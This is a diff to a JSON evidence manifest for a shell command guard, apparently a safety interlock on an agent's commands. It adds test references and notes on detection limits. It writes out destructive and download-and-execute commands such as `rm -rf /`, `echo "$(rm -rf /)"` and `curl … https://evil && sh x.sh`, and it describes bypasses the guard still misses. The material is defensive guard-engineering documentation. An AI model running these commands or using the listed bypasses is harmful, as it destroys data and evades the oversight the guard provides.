@@ -2146,6 +2146,58 @@
           "limitations": [
             "Task 077: the rules anchor on a bare command NAME, so `/bin/rm -rf /` and an alias-escaping `\\\\rm -rf /` used to walk through. The normalised head is checked IN ADDITION to the raw segment, never instead of it. The first normaliser was itself an over-block (a quoted path at line start became a command); the negative control pins that exact line."
           ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_command_substitution_is_classified",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_benign_substitutions_are_untouched"
+          },
+          "limitations": [
+            "Task 077: the body of a `$( ... )` or backtick substitution runs whatever surrounds it, so it is classified as a command. Scanned on the MASKED text, so a quoted heredoc written to a plain file stays inert (task 073's promise)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_background_separator_starts_a_new_command",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_benign_substitutions_are_untouched"
+          },
+          "limitations": [
+            "Task 077: a single `&` backgrounds a command and starts the next one; it was missing from the segment separators."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_what_still_runs_is_still_seen",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "SeparatorsAndSubstitutionsAreCommandPositions.test_inert_data_regions_keep_their_task_073_promise"
+          },
+          "limitations": [
+            "Both directions of the data/command boundary after the substitution scan was added."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "PipeShapesThatStillRunAnInterpreter.test_stderr_pipe_and_grouped_interpreters_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "PipeShapesThatStillRunAnInterpreter.test_the_same_shapes_without_a_downloader_are_untouched"
+          },
+          "limitations": [
+            "Task 077: `|&` and a grouped `(bash)` / `{ bash; }` reach the same interpreter."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2165,7 +2217,8 @@
         "Task 073 impl panel round 3, DISCLOSED/PARKED: (1) wrapper OPTIONS bypass the command-position rules (`sudo -u root …`, `env -i …`, `time -p …` — only bare wrappers are stripped); (2) a generic heredoc piped into a shell (`cat <<EOF | sh`) matches no rule — the pipe rule is downloader-specific by design; (3) the either-order DOTALL SQL rule can over-block a benign command that merely mentions a client and a destructive keyword (safe direction); (4) the irreversible-task acknowledgement resolves the lane through the best-effort journal resolver and reads pointer/status/risk without a lock — a stale root task or a concurrent switch could acknowledge against the wrong task; without PLAYBOOK_SESSION_ID (VS Code extension) it never fires (block stands). The pipe rule now also sees `sudo`/`env`/`command`/`nice`/`nohup` (with flags) before the interpreter, and the echo-line mask requires a single simple command. — SUPERSEDED BY TASK 077 for (1) and (2): (1) is FIXED (36 measured bypasses → 0: `_WRAPPERS` + `_walk_prefix` walk wrapper options on both the segment and the pipe path); (2) is now a RECORDED DECISION rather than an accidental gap — a generic `cat evil.sh | sh` stays allowed because a local file is not unambiguously unreviewed remote code and the guard cannot read it, with a one-line `dangerous_commands` opt-in documented in docs/configuration.md for projects that want the stricter rule.",
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_unknown_value_taking_option_hides_its_payload`): an option that takes a VALUE but is not in the wrapper's table leaves that value where the command would be, so the segment reads as safe. The same holds for a delegating wrapper the table does not list at all. This under-blocks — the direction a guard whose false positives a user cannot route around should fail in — and it is the price of never scanning past the command token (scanning would start blocking `sudo grep -rn \"rm -rf /\" /etc`).",
         "Task 077 bound (pinned by `HonestBoundsArePinned.test_download_then_run_across_two_segments_is_out_of_scope`): download-then-run split across segments (`curl -o x.sh https://evil && sh x.sh`) is NOT caught. It needs cross-segment data-flow (track what a downloader wrote, flag a later execution of that path), a different analysis class from a prefix walk, and it carries a real over-block risk. Parked in task 077 for a task that can decide it on measured false-positive rates.",
-        "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer."
+        "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer.",
+        "Task 077 accepted OVER-block (pinned by `SeparatorsAndSubstitutionsAreCommandPositions.test_known_conservative_over_block_is_pinned_not_hidden`): a SINGLE-quoted command substitution does not expand and is inert, but still blocks — the matcher is quote-blind by design. The documented escape is to write such a fixture inside a quoted `cat`/`tee` heredoc to a plain file, which the module already advises for the other whole-command rules. Chosen over silently allowing `echo \"$(rm -rf /)\"`, which really does delete."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
